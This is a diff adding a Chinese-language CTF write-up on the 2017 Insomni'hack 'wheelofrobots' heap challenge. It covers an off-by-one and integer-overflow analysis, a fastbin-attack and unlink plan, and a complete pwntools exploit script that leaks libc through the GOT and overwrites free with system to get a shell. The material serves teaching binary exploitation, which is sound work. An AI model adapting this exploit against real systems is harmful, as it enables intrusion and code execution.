@@ -720,13 +720,224 @@ get shell
 
 此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到shell了。
 
+2017 insomni'hack wheelofrobots
+-------------------------------
+
+基本信息
+~~~~~~~~
+
+.. code:: shell
+
+    ➜  2017_insomni'hack_wheelofrobots git:(master) file wheelofrobots 
+    wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped
+    ➜  2017_insomni'hack_wheelofrobots git:(master) checksec wheelofrobots 
+    [*] "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni'hack_wheelofrobots/wheelofrobots"
+        Arch:     amd64-64-little
+        RELRO:    Partial RELRO
+        Stack:    Canary found
+        NX:       NX enabled
+        PIE:      No PIE (0x400000)
+
+动态链接64位，主要开启了 canary 保护与 nx 保护。
+
+基本功能
+~~~~~~~~
+
+大概分析程序，可以得知，这是一个配置机器人轮子的游戏，机器人一共需要添加 3 个轮子。
+
+程序非常依赖的一个功能是读取整数，该函数read\_num是读取指定的长度，将其转化为 int 类型的数字。
+
+具体功能如下
+
+-  添加轮子，一共有 6 个轮子可以选择。选择轮子时使用函数是read\_num，然而该函数在读取的时候\ ``read_num((char *)&choice, 5uLL);`` 读取的长度是 5 个字节，恰好覆盖了 bender\_inuse 的最低字节，即构成了
+   off-by-one 漏洞。与此同时，在添加 Destructor 轮子的时候，并没有进行大小检测。如果读取的数为负数，那么在申请\ ``calloc(1uLL, 20 * v5);`` 时就可能导致 ``20*v5`` 溢出，但与此同时，
+   ``destructor_size = v5`` 仍然会很大。
+-  移除轮子，直接将相应轮子移除，但是并没有将其对应的指针设置为 NULL ，其对应的大小也没有清空。
+-  修改轮子名字，这个是根据当时申请的轮子的大小空间来读取数据。之前我们已经说过 destructor 轮子读取大小时，并没有检测负数的情况，所以在进行如下操作时
+   ``result = read(0, destructor, 20 * destructor_size);`` ，存在几乎任意长度溢出的漏洞。
+-  启动机器人，在启动的时候会随机地输出一些轮子的名称，这个是我们难以控制的。
+
+综上分析，我们可以知道的是，该程序主要存在的漏洞 off-by-one 与整数溢出。这里我们主要使用前面的off-by-one 漏洞。
+
+利用思路
+~~~~~~~~
+
+基本利用思路如下
+
+1. 利用 off by one 漏洞与 fastbin attack 分配 chunk 到 0x603138，进而可以控制 ``destructor_size``\ 的大小，从而实现任意长度堆溢出。这里我们将轮子1 tinny 分配到这里。
+2. 分别分配合适大小的物理相邻的 chunk，其中包括 destructor。借助上面可以任意长度堆溢出的漏洞，对 destructor 对应的 chunk 进行溢出，将其溢出到下一个物理相邻的 chunk，从而实现对 0x6030E8 处 fake chunk
+   进行 unlink 的效果，这时 bss 段的 destructor 指向 0x6030D0。从而，我们可以再次实现覆盖bss 段几乎所有的内容。
+3. 构造一个任意地址写的漏洞。通过上述的漏洞将已经分配的轮子1 tinny 指针覆盖为 destructor 的地址，那么此后编辑 tinny 即在编辑 destructor 的内容，进而当我们再次编辑 destructor 时就相当于任意低地址写。
+4. 由于程序只是在最后启动机器人的时候，才会随机输出一些轮子的内容，并且一旦输出，程序就会退出，由于这部分我们并不能控制，所以我们将 ``exit()`` patch 为一个 ``ret``
+   地址。这样的话，我们就可以多次输出内容了，从而可以泄漏一些 got 表地址。\ **其实，既然我们有了任意地址写的漏洞，我们也可以将某个 got 写为 puts 的 plt
+   地址，进而调用相应函数时便可以直接将相应内容输出。但是这里并不去采用这种方法，因为之前已经在 hitcon stkof 中用过这种手法了。**
+5. 在泄漏了相应的内容后，我们便可以得到 libc 基地址，system 地址，libc中的 /bin/sh 地址。进而我们修改 free@got 为 system 地址。从而当再次释放某块内存时，便可以启动shell。
+
+代码如下
+
+.. code:: python
+
+    from pwn import *
+    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+    if args['DEBUG']:
+        context.log_level = 'debug'
+    context.binary = "./wheelofrobots"
+    robots = ELF('./wheelofrobots')
+    if args['REMOTE']:
+        p = remote('127.0.0.1', 7777)
+    else:
+        p = process("./wheelofrobots")
+    log.info('PID: ' + str(proc.pidof(p)[0]))
+    libc = ELF('./libc.so.6')
+
+
+    def offset_bin_main_arena(idx):
+        word_bytes = context.word_size / 8
+        offset = 4  # lock
+        offset += 4  # flags
+        offset += word_bytes * 10  # offset fastbin
+        offset += word_bytes * 2  # top,last_remainder
+        offset += idx * 2 * word_bytes  # idx
+        offset -= word_bytes * 2  # bin overlap
+        return offset
+
+
+    def add(idx, size=0):
+        p.recvuntil('Your choice :')
+        p.sendline('1')
+        p.recvuntil('Your choice :')
+        p.sendline(str(idx))
+        if idx == 2:
+            p.recvuntil("Increase Bender's intelligence: ")
+            p.sendline(str(size))
+        elif idx == 3:
+            p.recvuntil("Increase Robot Devil's cruelty: ")
+            p.sendline(str(size))
+        elif idx == 6:
+            p.recvuntil("Increase Destructor's powerful: ")
+            p.sendline(str(size))
+
+
+    def remove(idx):
+        p.recvuntil('Your choice :')
+        p.sendline('2')
+        p.recvuntil('Your choice :')
+        p.sendline(str(idx))
+
+
+    def change(idx, name):
+        p.recvuntil('Your choice :')
+        p.sendline('3')
+        p.recvuntil('Your choice :')
+        p.sendline(str(idx))
+        p.recvuntil("Robot's name: \n")
+        p.send(name)
+
+
+    def start_robot():
+        p.recvuntil('Your choice :')
+        p.sendline('4')
+
+
+    def overflow_benderinuse(inuse):
+        p.recvuntil('Your choice :')
+        p.sendline('1')
+        p.recvuntil('Your choice :')
+        p.send('9999' + inuse)
+
+
+    def write(where, what):
+        change(1, p64(where))
+        change(6, p64(what))
+
+
+    def exp():
+        print "step 1"
+        # add a fastbin chunk 0x20 and free it
+        # so it is in fastbin, idx2->NULL
+        add(2, 1)  # idx2
+        remove(2)
+        # overflow bender inuse with 1
+        overflow_benderinuse('\x01')
+        # change bender's fd to 0x603138, point to bender's size
+        # now fastbin 0x20, idx2->0x603138->NULL
+        change(2, p64(0x603138))
+        # in order add bender again
+        overflow_benderinuse('\x00')
+        # add bender again, fastbin 0x603138->NULL
+        add(2, 1)
+        # in order to malloc chunk at 0x603138
+        # we need to bypass the fastbin size check, i.e. set *0x603140=0x20
+        # it is at Robot Devil
+        add(3, 0x20)
+        # trigger malloc, set tinny point to 0x603148
+        add(1)
+        # wheels must <= 3
+        remove(2)
+        remove(3)
+
+        print 'step 2'
+        # alloc Destructor size 60->0x50, chunk content 0x40
+        add(6, 3)
+        # alloc devil, size=20*7=140, bigger than fastbin
+        add(3, 7)
+        # edit destructor's size to 1000 by tinny
+        change(1, p64(1000))
+        # place fake chunk at destructor's pointer
+        fakechunk_addr = 0x6030E8
+        fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(
+            fakechunk_addr - 0x10) + p64(0x20)
+        fakechunk = fakechunk.ljust(0x40, 'a')
+        fakechunk += p64(0x40) + p64(0xa0)
+        change(6, fakechunk)
+        # trigger unlink
+        remove(3)
+
+        print 'step 3'
+        # make 0x6030F8 point to 0x6030E8
+        payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)
+        change(6, payload)
+
+        print 'step 4'
+        # make exit just as return
+        write(robots.got['exit'], 0x401954)
+
+        print 'step 5'
+        # set wheel cnt =3, 0x603130 in order to start robot
+        write(0x603130, 3)
+        # set destructor point to puts@got
+        change(1, p64(robots.got['puts']))
+        start_robot()
+        p.recvuntil('New hands great!! Thx ')
+        puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00')
+        puts_addr = u64(puts_addr)
+        log.success('puts addr: ' + hex(puts_addr))
+        libc_base = puts_addr - libc.symbols['puts']
+        log.success('libc base: ' + hex(libc_base))
+        system_addr = libc_base + libc.symbols['system']
+        binsh_addr = libc_base + next(libc.search('/bin/sh'))
+
+        # make free->system
+        write(robots.got['free'], system_addr)
+        # make destructor point to /bin/sh addr
+        write(0x6030E8, binsh_addr)
+        # get shell
+        remove(6)
+        p.interactive()
+
+        pass
+
+
+    if __name__ == "__main__":
+        exp()
+
 题目
 ----
 
--  `Insomni'hack 2017-Wheel of Robots <https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a>`__
 -  `DEFCON 2017 Qualifiers beatmeonthedl <https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl>`__
 
 参考
 ----
 
 -  malloc@angelboy
+-  https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a
